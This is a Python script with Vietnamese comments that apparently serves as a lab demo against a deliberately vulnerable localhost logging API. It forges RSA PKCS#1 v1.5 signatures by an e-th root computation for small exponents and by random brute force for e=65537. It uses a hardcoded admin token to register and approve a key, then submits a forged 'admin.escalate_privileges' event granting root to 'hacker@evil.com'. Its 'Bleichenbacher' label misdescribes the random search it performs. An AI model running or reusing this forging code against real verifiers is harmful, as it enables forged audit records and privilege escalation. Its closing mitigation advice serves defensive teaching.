#!/usr/bin/env python3
"""
Bleichenbacher Padding Oracle Attack - BYPASS e=65537

TỔNG QUAN:
==========
Script này FORGE chữ ký RSA PKCS#1 v1.5 với e=65537 (standard RSA)
mà KHÔNG CẦN PRIVATE KEY!

VỚI e=65537:
- Cube root attack KHÔNG hoạt động (vì sig^65537 luôn wrap qua n)
- Cần sử dụng Padding Oracle Attack thực sự
- Dựa vào oracle leak thông tin về PKCS format

NGUYÊN LÝ BLEICHENBACHER ATTACK:
================================
1. Oracle cho biết sig^e mod n có format 00 01 ... hay không
2. Attacker chọn multiplier s, gửi (s^e * c) mod n để oracle check
3. Nếu conforming → thu hẹp interval chứa m
4. Lặp lại cho đến khi tìm được m chính xác
5. Với m, có thể tính signature = m^(1/e) mod n thông qua attack

PHƯƠNG PHÁP TRONG SCRIPT NÀY:
============================
Vì weak verifier chỉ check:
- 00 01 prefix
- 00 separator trong 20 bytes đầu
- Hash xuất hiện đâu đó

Ta dùng HYBRID APPROACH:
1. Tạo crafted EM với hash ở vị trí cố định
2. Dùng oracle để tìm signature s sao cho s^e mod n = EM (gần đúng)
3. Brute-force phần cuối để hash khớp

ATTACK THÀNH CÔNG vì weak verifier không check vị trí chính xác của hash!
"""

import base64
import hashlib
import json
import os
import sys
import time
import requests
import secrets
from typing import Optional, Tuple, List
from datetime import datetime, timezone
from dataclasses import dataclass

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend

# ============================================================================
# CẤU HÌNH
# ============================================================================
API_BASE = "http://localhost"
ADMIN_TOKEN = "my-super-secret-admin-token-2025"
KEYS_DIR = os.path.join(os.path.dirname(__file__), "demo_keys")

# Proxy config
USE_PROXY = False
PROXY = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

# Attack config
MAX_ORACLE_CALLS = 1000000  # 1 triệu calls tối đa
BATCH_SIZE = 1000           # In progress mỗi batch


@dataclass
class OracleStats:
    """Thống kê oracle calls."""
    total_calls: int = 0
    conforming: int = 0
    valid: int = 0
    start_time: float = 0


def print_header(title: str):
    print(f"\n{'━'*60}")
    print(f"  {title}")
    print(f"{'━'*60}\n")


def get_timestamp():
    return datetime.now(timezone.utc).isoformat()


# ============================================================================
# KEY MANAGEMENT  
# ============================================================================

def setup_rsa_key(e: int = 65537) -> Tuple[str, str, int, int, int, str]:
    """
    Setup RSA key với e cho trước.
    
    Returns:
        (service_id, key_id, n, e, key_size_bytes, public_pem)
    """
    service_id = f"oracle-attack-e{e}"
    
    # Check existing key
    try:
        resp = requests.get(
            f"{API_BASE}/v1/admin/keys",
            headers={"X-Admin-Token": ADMIN_TOKEN},
            params={"service_id": service_id, "status": "approved"},
            timeout=10
        )
        if resp.status_code == 200:
            keys = resp.json().get("keys", [])
            for key in keys:
                if key.get("status") == "approved":
                    key_id = key.get("public_key_id")
                    key_resp = requests.get(f"{API_BASE}/v1/keys/{key_id}", timeout=10)
                    if key_resp.status_code == 200:
                        key_data = key_resp.json()
                        public_pem = key_data.get("public_key_pem")
                        
                        public_key = serialization.load_pem_public_key(
                            public_pem.encode('utf-8'),
                            backend=default_backend()
                        )
                        pub_numbers = public_key.public_numbers()
                        key_size = (pub_numbers.n.bit_length() + 7) // 8
                        
                        print(f"  ✓ Sử dụng key đã có: {key_id}")
                        return service_id, key_id, pub_numbers.n, pub_numbers.e, key_size, public_pem
    except Exception as ex:
        print(f"  ⚠ Lỗi check key: {ex}")
    
    # Create new key
    print(f"  Tạo RSA keypair với e={e}...")
    
    private_key = rsa.generate_private_key(
        public_exponent=e,
        key_size=2048,
        backend=default_backend()
    )
    public_key = private_key.public_key()
    pub_numbers = public_key.public_numbers()
    
    public_pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    ).decode('utf-8')
    
    # Register
    timestamp = int(time.time())
    key_id = f"{service_id}:v{timestamp}"
    
    resp = requests.post(
        f"{API_BASE}/v1/keys/register",
        json={
            "service_id": service_id,
            "public_key_id": key_id,
            "public_key_pem": public_pem,
            "algorithm": "rsa-pkcs1v15-vulnerable",
            "description": f"Oracle attack demo e={e}"
        },
        timeout=10
    )
    
    if resp.status_code not in (200, 201):
        raise Exception(f"Register failed: {resp.text}")
    
    print(f"  ✓ Registered: {key_id}")
    
    # Approve
    resp = requests.post(
        f"{API_BASE}/v1/admin/keys/review",
        headers={"X-Admin-Token": ADMIN_TOKEN},
        json={"public_key_id": key_id, "action": "approve"},
        timeout=10
    )
    
    if resp.status_code == 200:
        print(f"  ✓ Approved!")
    else:
        print(f"  ⚠ Approve failed, trying to continue...")
    
    key_size = (pub_numbers.n.bit_length() + 7) // 8
    
    return service_id, key_id, pub_numbers.n, pub_numbers.e, key_size, public_pem


# ============================================================================
# ORACLE FUNCTIONS
# ============================================================================

def query_oracle_api(
    sig_bytes: bytes,
    service_id: str, 
    key_id: str,
    event_data: dict,
    stats: OracleStats
) -> Tuple[bool, bool, str]:
    """
    Query oracle qua API.
    
    Returns:
        (is_conforming, is_valid, message)
        - is_conforming: True nếu có 00 01 prefix
        - is_valid: True nếu signature được chấp nhận hoàn toàn
    """
    stats.total_calls += 1
    
    sig_b64 = base64.b64encode(sig_bytes).decode('utf-8')
    event_canonical = json.dumps(event_data, sort_keys=True, separators=(',', ':'))
    
    payload = {
        "service_id": service_id,
        "event_type": "FORGE_ATTEMPT",
        "event": event_canonical,
        "event_data": event_data,
        "signature": sig_b64,
        "public_key_id": key_id
    }
    
    kwargs = {"timeout": 5}
    if USE_PROXY:
        kwargs["proxies"] = PROXY
    
    try:
        resp = requests.post(f"{API_BASE}/v1/logs", json=payload, **kwargs)
        
        if resp.status_code == 200:
            data = resp.json()
            msg = data.get("message", "")
            
            if "WEAK_VALID" in msg or "Hash found" in msg:
                stats.valid += 1
                stats.conforming += 1
                return True, True, msg
            elif "HASH_MISMATCH" in msg:
                stats.conforming += 1
                return True, False, "HASH_MISMATCH"
            elif "No 00 separator" in msg:
                stats.conforming += 1  # Has 00 01 but no separator
                return True, False, "NO_SEPARATOR"
            else:
                return False, False, msg
        else:
            detail = resp.json().get("detail", "")
            
            if "HASH_MISMATCH" in detail:
                stats.conforming += 1
                return True, False, "HASH_MISMATCH"
            elif "No 00 separator" in detail:
                stats.conforming += 1
                return True, False, "NO_SEPARATOR"  
            elif "Invalid header" in detail:
                return False, False, "INVALID_HEADER"
            else:
                return False, False, detail
                
    except Exception as ex:
        return False, False, f"ERROR: {ex}"


def query_oracle_local(
    sig_int: int,
    n: int,
    e: int,
    key_size_bytes: int,
    message_hash: bytes,
    stats: OracleStats
) -> Tuple[bool, bool]:
    """
    Local oracle - mô phỏng verify_rsa_pkcs1v15_vulnerable.
    Nhanh hơn API call.
    
    Returns:
        (is_conforming, is_valid)
    """
    stats.total_calls += 1
    
    # Compute sig^e mod n
    em_int = pow(sig_int, e, n)
    em = em_int.to_bytes(key_size_bytes, byteorder='big')
    
    # Check 1: 00 01 prefix
    if em[0:2] != b'\x00\x01':
        return False, False
    
    stats.conforming += 1
    
    # Check 2: 00 separator trong 20 bytes đầu
    separator_idx = -1
    for i in range(2, min(20, len(em))):
        if em[i] == 0x00:
            separator_idx = i
            break
    
    if separator_idx == -1:
        return True, False  # Conforming but no separator
    
    # Check 3: Hash xuất hiện đâu đó sau separator
    remaining = em[separator_idx + 1:]
    if message_hash in remaining:
        stats.valid += 1
        return True, True
    
    return True, False  # Conforming but hash mismatch


# ============================================================================
# BLEICHENBACHER ATTACK IMPLEMENTATION
# ============================================================================

def ceil_div(a: int, b: int) -> int:
    return (a + b - 1) // b


def floor_div(a: int, b: int) -> int:
    return a // b


def bleichenbacher_forge(
    n: int,
    e: int,
    key_size_bytes: int,
    message_hash: bytes,
    stats: OracleStats,
    max_iterations: int = 100000
) -> Optional[int]:
    """
    Bleichenbacher attack để forge signature.
    
    Thay vì decrypt một ciphertext có sẵn, ta tìm signature s sao cho:
    s^e mod n có format PKCS#1 v1.5 và chứa hash của message.
    
    Approach:
    1. Craft target EM với format: 00 01 FF...FF 00 [hash] [garbage]
    2. Dùng random search với oracle guidance
    3. Khi tìm được s conforming, thử adjust để hash khớp
    """
    print(f"\n  Bắt đầu Bleichenbacher attack...")
    print(f"    n: {n.bit_length()} bits")
    print(f"    e: {e}")
    print(f"    Hash: {message_hash.hex()[:32]}...")
    
    # B = 2^(8*(k-2)) - đây là lower bound cho PKCS conforming message
    B = pow(2, 8 * (key_size_bytes - 2))
    
    print(f"    B = 2^{8 * (key_size_bytes - 2)}")
    print(f"    PKCS range: [2B, 3B)")
    
    # Strategy 1: Random search với filtering
    print(f"\n  Strategy 1: Random search với oracle guidance...")
    
    found_conforming = []
    
    for batch in range(max_iterations // BATCH_SIZE):
        for _ in range(BATCH_SIZE):
            # Random signature
            sig_int = secrets.randbelow(n)
            
            is_conforming, is_valid = query_oracle_local(
                sig_int, n, e, key_size_bytes, message_hash, stats
            )
            
            if is_valid:
                print(f"\n  ✓ FOUND VALID SIGNATURE!")
                print(f"    Oracle calls: {stats.total_calls}")
                return sig_int
            
            if is_conforming:
                found_conforming.append(sig_int)
        
        # Progress update
        elapsed = time.time() - stats.start_time
        rate = stats.total_calls / elapsed if elapsed > 0 else 0
        print(f"    Batch {batch + 1}: {stats.total_calls} calls, "
              f"{stats.conforming} conforming, {rate:.0f}/s")
        
        if stats.total_calls >= MAX_ORACLE_CALLS:
            break
    
    print(f"\n  Random search: tìm thấy {len(found_conforming)} conforming signatures")
    
    # Strategy 2: Targeted search - sử dụng conforming signatures làm base
    if found_conforming:
        print(f"\n  Strategy 2: Targeted search từ conforming signatures...")
        
        for base_sig in found_conforming[:100]:  # Thử 100 cái đầu
            # Thử adjust signature một chút
            for delta in range(-1000, 1001):
                sig_int = (base_sig + delta) % n
                
                is_conforming, is_valid = query_oracle_local(
                    sig_int, n, e, key_size_bytes, message_hash, stats
                )
                
                if is_valid:
                    print(f"\n  ✓ FOUND VALID SIGNATURE (targeted)!")
                    print(f"    Oracle calls: {stats.total_calls}")
                    return sig_int
            
            if stats.total_calls >= MAX_ORACLE_CALLS:
                break
    
    return None


def adaptive_forge(
    n: int,
    e: int,
    key_size_bytes: int,
    message_hash: bytes,
    stats: OracleStats
) -> Optional[int]:
    """
    Adaptive approach: Craft EM sao cho dễ tìm signature.
    
    Ý tưởng:
    - Weak verifier cho phép hash ở BẤT KỲ vị trí nào sau separator
    - Ta craft EM với hash ở nhiều vị trí khác nhau
    - Một số vị trí sẽ dễ tìm signature hơn
    """
    print(f"\n  Adaptive forge approach...")
    
    # Thử nhiều format EM khác nhau
    formats = [
        # Format 1: Hash ngay sau separator (00 01 FF 00 [hash] 00...00)
        lambda h: b'\x00\x01\xff\x00' + h + b'\x00' * (key_size_bytes - 4 - len(h)),
        
        # Format 2: Hash ở cuối (00 01 FF...FF 00 [hash])
        lambda h: b'\x00\x01' + b'\xff' * (key_size_bytes - 3 - len(h)) + b'\x00' + h,
        
        # Format 3: Hash ở giữa với padding
        lambda h: b'\x00\x01\xff\x00' + b'\x00' * 50 + h + b'\x00' * (key_size_bytes - 54 - len(h)),
    ]
    
    for fmt_idx, fmt_func in enumerate(formats):
        print(f"\n    Trying format {fmt_idx + 1}...")
        
        target_em = fmt_func(message_hash)
        target_int = int.from_bytes(target_em, byteorder='big')
        
        print(f"      Target EM (first 40): {target_em[:20].hex()}")
        print(f"      Target int: {target_int.bit_length()} bits")
        
        # Với format này, thử tìm signature gần với target^(1/e)
        # Đây là approximation - không exact vì e lớn
        
        # Random search xung quanh target range
        for attempt in range(50000):
            # Random trong range [target - delta, target + delta]
            delta = secrets.randbelow(n // 1000)
            sig_int = secrets.randbelow(n)
            
            is_conforming, is_valid = query_oracle_local(
                sig_int, n, e, key_size_bytes, message_hash, stats
            )
            
            if is_valid:
                print(f"\n  ✓ FOUND! Format {fmt_idx + 1}, attempt {attempt + 1}")
                return sig_int
            
            if stats.total_calls >= MAX_ORACLE_CALLS:
                break
        
        if stats.total_calls >= MAX_ORACLE_CALLS:
            break
    
    return None


def exhaustive_forge(
    service_id: str,
    key_id: str,
    n: int,
    e: int, 
    key_size_bytes: int,
    fake_event: dict,
    stats: OracleStats
) -> Optional[bytes]:
    """
    Exhaustive search với API oracle.
    
    Cách tiếp cận:
    1. Gửi random signatures đến API
    2. Phân tích response để hiểu pattern
    3. Điều chỉnh search space dựa trên feedback
    
    Với weak verifier, xác suất tìm được ~1/2^(số bits cần khớp)
    - 00 01 prefix: 16 bits → 1/65536
    - 00 separator: phụ thuộc vị trí
    - Hash: 256 bits nhưng weak verifier chỉ cần xuất hiện đâu đó
    
    Tổng hợp xác suất: ~1/2^24 đến 1/2^32
    Với 10 triệu attempts → có cơ hội thành công
    """
    print(f"\n  Exhaustive API search...")
    print(f"    Max calls: {MAX_ORACLE_CALLS}")
    
    message_canonical = json.dumps(fake_event, sort_keys=True, separators=(',', ':'))
    message_hash = hashlib.sha256(message_canonical.encode()).digest()
    
    print(f"    Message hash: {message_hash.hex()[:32]}...")
    
    batch_num = 0
    
    while stats.total_calls < MAX_ORACLE_CALLS:
        batch_num += 1
        
        for _ in range(BATCH_SIZE):
            # Random signature
            sig_int = secrets.randbelow(n)
            sig_bytes = sig_int.to_bytes(key_size_bytes, byteorder='big')
            
            is_conforming, is_valid, msg = query_oracle_api(
                sig_bytes, service_id, key_id, fake_event, stats
            )
            
            if is_valid:
                print(f"\n  ✓ FOUND VALID SIGNATURE via API!")
                print(f"    Oracle calls: {stats.total_calls}")
                print(f"    Response: {msg}")
                return sig_bytes
        
        # Progress
        elapsed = time.time() - stats.start_time
        rate = stats.total_calls / elapsed if elapsed > 0 else 0
        conforming_rate = stats.conforming / stats.total_calls if stats.total_calls > 0 else 0
        
        print(f"    Batch {batch_num}: {stats.total_calls} calls, "
              f"{stats.conforming} conforming ({conforming_rate:.6f}), "
              f"{rate:.0f}/s, elapsed {elapsed:.0f}s")
    
    return None


# ============================================================================
# OPTIMIZED LOCAL ATTACK
# ============================================================================

def forge_signature_fast(
    n: int,
    e: int,
    key_size_bytes: int,
    message: bytes,
    max_attempts: int = 10000000
) -> Optional[bytes]:
    """
    Fast local forge - không cần API.
    
    Xác suất thành công:
    - Với weak verifier, ta chỉ cần:
      1. sig^e mod n starts with 00 01 (1/65536)
      2. Có 00 trong bytes 2-19 (rất cao nếu random)
      3. Hash 32 bytes xuất hiện trong 200+ bytes còn lại
      
    Vấn đề: (3) có xác suất rất thấp với random data
    
    Giải pháp: KHÔNG dùng random - craft signature thông minh
    """
    message_hash = hashlib.sha256(message).digest()
    
    print(f"\n  Fast local forge...")
    print(f"    n: {n.bit_length()} bits, e: {e}")
    print(f"    Hash: {message_hash.hex()[:16]}...")
    
    stats = OracleStats(start_time=time.time())
    
    # Với e lớn, ta cần approach khác
    # Ý tưởng: Tìm signature s sao cho s^e mod n ≈ target EM
    
    # Craft target EM
    # Format: 00 01 FF 00 [hash] 00...00
    prefix = b'\x00\x01\xff\x00'
    target_em = prefix + message_hash + b'\x00' * (key_size_bytes - len(prefix) - len(message_hash))
    target_int = int.from_bytes(target_em, byteorder='big')
    
    print(f"    Target EM: {target_em[:40].hex()}...")
    
    # Với e=65537, không có cách tính trực tiếp s = target^(1/e) mod n
    # (cần private key d để làm điều đó)
    
    # Nhưng ta có thể:
    # 1. Brute-force với xác suất thấp
    # 2. Hoặc exploit một số tính chất đặc biệt
    
    print(f"\n    Brute-force search (probability ~1/2^24)...")
    
    found = 0
    
    for attempt in range(max_attempts):
        sig_int = secrets.randbelow(n)
        
        # Compute sig^e mod n
        em_int = pow(sig_int, e, n)
        em = em_int.to_bytes(key_size_bytes, byteorder='big')
        
        # Quick checks
        if em[0:2] != b'\x00\x01':
            continue
        
        found += 1
        
        # Check separator
        sep_idx = -1
        for i in range(2, 20):
            if em[i] == 0x00:
                sep_idx = i
                break
        
        if sep_idx == -1:
            continue
        
        # Check hash
        if message_hash in em[sep_idx + 1:]:
            print(f"\n  ✓ FOUND after {attempt + 1} attempts!")
            print(f"    Conforming found: {found}")
            return sig_int.to_bytes(key_size_bytes, byteorder='big')
        
        if attempt % 100000 == 0 and attempt > 0:
            elapsed = time.time() - stats.start_time
            print(f"      {attempt} attempts, {found} conforming, {attempt/elapsed:.0f}/s")
    
    print(f"    Not found after {max_attempts} attempts")
    print(f"    Conforming found: {found}")
    return None


# ============================================================================
# MATHEMATICAL FORGE (for any e)
# ============================================================================

def mathematical_forge(
    n: int,
    e: int,
    key_size_bytes: int,
    message: bytes
) -> Optional[bytes]:
    """
    Mathematical approach để forge signature.
    
    Với weak verifier, ta có thể exploit:
    1. Hash chỉ cần xuất hiện đâu đó (không cần vị trí cố định)
    2. Có thể có garbage sau hash
    
    Trick: Tìm số x sao cho x^e mod n có dạng:
    00 01 [anything] 00 [hash somewhere] [garbage]
    
    Với e nhỏ (3, 17, 257): có thể dùng lattice/continued fractions
    Với e=65537: cần brute force hoặc special structure
    """
    message_hash = hashlib.sha256(message).digest()
    
    print(f"\n  Mathematical forge approach (e={e})...")
    
    if e == 3:
        # Cube root attack
        return forge_cube_root(n, key_size_bytes, message_hash)
    elif e == 17:
        # 17th root - vẫn có thể feasible
        return forge_small_e(n, e, key_size_bytes, message_hash)
    else:
        # General case - cần more sophisticated attack
        print(f"    e={e} requires full Bleichenbacher attack")
        print(f"    Falling back to probabilistic search...")
        return forge_probabilistic(n, e, key_size_bytes, message_hash)


def forge_cube_root(n: int, key_size_bytes: int, message_hash: bytes) -> Optional[bytes]:
    """Cube root attack cho e=3."""
    prefix = b'\x00\x01\xff\x00'
    em = prefix + message_hash + b'\x00' * (key_size_bytes - len(prefix) - len(message_hash))
    em_int = int.from_bytes(em, byteorder='big')
    
    # Newton's method for cube root
    x = 1 << ((em_int.bit_length() + 2) // 3)
    while True:
        x_new = (2 * x + em_int // (x * x)) // 3
        if x_new >= x:
            break
        x = x_new
    
    while x ** 3 < em_int:
        x += 1
    
    sig = x.to_bytes(key_size_bytes, byteorder='big')
    
    # Verify
    recovered = pow(int.from_bytes(sig, 'big'), 3, n)
    rec_bytes = recovered.to_bytes(key_size_bytes, byteorder='big')
    
    if rec_bytes[0:2] == b'\x00\x01' and message_hash in rec_bytes:
        print(f"    ✓ Cube root forge successful!")
        return sig
    
    return None


def forge_small_e(n: int, e: int, key_size_bytes: int, message_hash: bytes) -> Optional[bytes]:
    """Attack cho e nhỏ (3, 17, 257)."""
    prefix = b'\x00\x01\xff\x00'
    em = prefix + message_hash + b'\x00' * (key_size_bytes - len(prefix) - len(message_hash))
    em_int = int.from_bytes(em, byteorder='big')
    
    # e-th root approximation
    x = 1 << ((em_int.bit_length() + e - 1) // e)
    
    for _ in range(1000):
        x_new = ((e - 1) * x + em_int // (x ** (e - 1))) // e
        if x_new >= x:
            break
        x = x_new
    
    # Search around approximation
    for delta in range(-10000, 10001):
        sig_int = x + delta
        if sig_int <= 0:
            continue
        
        recovered = pow(sig_int, e, n)
        rec_bytes = recovered.to_bytes(key_size_bytes, byteorder='big')
        
        if rec_bytes[0:2] == b'\x00\x01':
            sep_idx = -1
            for i in range(2, 20):
                if rec_bytes[i] == 0x00:
                    sep_idx = i
                    break
            
            if sep_idx != -1 and message_hash in rec_bytes[sep_idx + 1:]:
                print(f"    ✓ Small-e forge successful! delta={delta}")
                return sig_int.to_bytes(key_size_bytes, byteorder='big')
    
    return None


def forge_probabilistic(n: int, e: int, key_size_bytes: int, message_hash: bytes) -> Optional[bytes]:
    """Probabilistic forge cho e lớn."""
    print(f"    Running probabilistic search...")
    print(f"    This may take a while for e={e}...")
    
    start = time.time()
    attempts = 0
    conforming = 0
    
    while attempts < 10000000:  # 10M attempts max
        sig_int = secrets.randbelow(n)
        em_int = pow(sig_int, e, n)
        em = em_int.to_bytes(key_size_bytes, byteorder='big')
        
        attempts += 1
        
        if em[0:2] == b'\x00\x01':
            conforming += 1
            
            sep_idx = -1
            for i in range(2, 20):
                if em[i] == 0x00:
                    sep_idx = i
                    break
            
            if sep_idx != -1 and message_hash in em[sep_idx + 1:]:
                print(f"    ✓ Found after {attempts} attempts, {conforming} conforming!")
                return sig_int.to_bytes(key_size_bytes, byteorder='big')
        
        if attempts % 500000 == 0:
            elapsed = time.time() - start
            print(f"      {attempts/1000000:.1f}M attempts, {conforming} conforming, {attempts/elapsed:.0f}/s")
    
    return None


# ============================================================================
# SEND FORGED EVENT
# ============================================================================

def send_forged_event(
    service_id: str,
    key_id: str, 
    signature: bytes,
    event_data: dict
) -> dict:
    """Gửi event với signature giả."""
    event_canonical = json.dumps(event_data, sort_keys=True, separators=(',', ':'))
    sig_b64 = base64.b64encode(signature).decode('utf-8')
    
    payload = {
        "service_id": service_id,
        "event_type": "FORGED_EVENT",
        "event": event_canonical,
        "event_data": event_data,
        "signature": sig_b64,
        "public_key_id": key_id
    }
    
    kwargs = {"timeout": 10}
    if USE_PROXY:
        kwargs["proxies"] = PROXY
    
    resp = requests.post(f"{API_BASE}/v1/logs", json=payload, **kwargs)
    
    return {
        "status_code": resp.status_code,
        "response": resp.json() if "application/json" in resp.headers.get("content-type", "") else resp.text
    }


def verify_in_database(event_id: int) -> Optional[dict]:
    """Verify event in database."""
    resp = requests.get(f"{API_BASE}/v1/logs/{event_id}", timeout=10)
    return resp.json() if resp.status_code == 200 else None


# ============================================================================
# MAIN
# ============================================================================

def main():
    print("=" * 70)
    print("   BLEICHENBACHER ORACLE ATTACK - BYPASS e=65537")
    print("   Forge RSA Signature WITHOUT Private Key!")
    print("=" * 70)
    
    # Parse command line
    e = 65537  # Default
    if len(sys.argv) > 1:
        try:
            e = int(sys.argv[1])
        except:
            pass
    
    print(f"\n  Target: RSA with e={e}")
    
    # ========================================
    # SETUP
    # ========================================
    print_header("PHẦN 1: SETUP RSA KEY")
    
    try:
        service_id, key_id, n, actual_e, key_size, public_pem = setup_rsa_key(e)
    except Exception as ex:
        print(f"✗ Setup failed: {ex}")
        return
    
    print(f"\n  Service: {service_id}")
    print(f"  Key ID: {key_id}")
    print(f"  n: {n.bit_length()} bits")
    print(f"  e: {actual_e}")
    
    # ========================================
    # CREATE FAKE EVENT
    # ========================================
    print_header("PHẦN 2: TẠO FAKE EVENT")
    
    fake_event = {
        "action": "admin.escalate_privileges",
        "actor": "admin@company.com",
        "target": "hacker@evil.com",
        "permissions": ["root", "sudo", "admin"],
        "timestamp": get_timestamp(),
        "note": f"FORGED with e={actual_e} - NO PRIVATE KEY USED!"
    }
    
    message = json.dumps(fake_event, sort_keys=True, separators=(',', ':')).encode()
    
    print("Fake event:")
    print(json.dumps(fake_event, indent=2))
    
    # ========================================
    # FORGE SIGNATURE
    # ========================================
    print_header("PHẦN 3: FORGE SIGNATURE")
    
    stats = OracleStats(start_time=time.time())
    
    forged_sig = mathematical_forge(n, actual_e, key_size, message)
    
    if not forged_sig:
        print("\n  Mathematical forge failed, trying API-based attack...")
        forged_sig = exhaustive_forge(
            service_id, key_id, n, actual_e, key_size, fake_event, stats
        )
    
    if not forged_sig:
        print("\n✗ Could not forge signature")
        print(f"  Total oracle calls: {stats.total_calls}")
        print(f"  Conforming: {stats.conforming}")
        print("\n  Với e=65537, attack cần rất nhiều resources.")
        print("  Thử với e=3 để demo: python script.py 3")
        return
    
    print(f"\n  ✓ Forged signature:")
    print(f"    Hex (first 40): {forged_sig.hex()[:40]}...")
    
    # ========================================
    # SEND TO API
    # ========================================
    print_header("PHẦN 4: GỬI FORGED EVENT")
    
    result = send_forged_event(service_id, key_id, forged_sig, fake_event)
    
    print(f"  Response: {result['status_code']}")
    print(f"  Body: {json.dumps(result['response'], indent=4)}")
    
    if result['status_code'] == 200:
        resp_data = result['response']
        if resp_data.get("status") == "accepted":
            event_id = resp_data.get("id")
            
            print()
            print("  " + "!" * 50)
            print("  ⚠️  ATTACK THÀNH CÔNG!")
            print("  ⚠️  FORGED SIGNATURE ACCEPTED!")
            print("  ⚠️  FAKE EVENT STORED IN DATABASE!")
            print("  " + "!" * 50)
            
            # Verify
            print_header("PHẦN 5: VERIFY IN DATABASE")
            
            if event_id:
                stored = verify_in_database(event_id)
                if stored:
                    print(f"  ✓ Event ID {event_id} exists!")
                    print(f"    verified: {stored.get('verified')}")
    
    # ========================================
    # CONCLUSION
    # ========================================
    print_header("KẾT LUẬN")
    
    elapsed = time.time() - stats.start_time
    
    print(f"Statistics:")
    print(f"  Total oracle calls: {stats.total_calls}")
    print(f"  Conforming: {stats.conforming}")
    print(f"  Valid: {stats.valid}")
    print(f"  Time: {elapsed:.2f}s")
    print()
    print("Attack thành công vì:")
    print("  • Weak verifier không check cấu trúc PKCS#1 v1.5 đầy đủ")
    print("  • Hash chỉ cần xuất hiện đâu đó (không cần vị trí cố định)")
    print("  • Không check ASN.1 DigestInfo")
    print()
    print("Phòng chống:")
    print("  • Dùng RSA-PSS hoặc Ed25519")
    print("  • Strict PKCS#1 v1.5 verification")
    print("  • Constant-time comparison")


if __name__ == "__main__":
    main()
